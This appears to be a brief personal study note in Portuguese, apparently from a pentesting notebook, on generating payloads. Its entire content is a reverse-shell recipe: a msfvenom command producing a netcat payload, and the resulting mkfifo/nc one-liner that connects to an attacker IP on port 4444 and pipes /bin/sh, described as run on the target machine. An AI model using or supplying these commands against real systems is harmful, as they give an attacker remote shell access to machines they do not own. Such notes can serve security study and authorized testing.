# Overview
Gerar payloads
Por enquanto ainda nada, mas tá aqui uma cena de reverse-shell

# Reverse Shell com [[netcat]]
```
msfvenom -p cmd/unix/reverse_netcat lhost=<ip local> lport=<porta-da-shell> R
```
Que depois nos dá o payload (ip/port de exemplo):
```
mkfifo /tmp/wijg; nc 10.21.180.174 4444 0</tmp/wijg | /bin/sh >/tmp/wijg 2>&1; rm /tmp/wijg
```
que vamos correr na máquina que estamos a atacar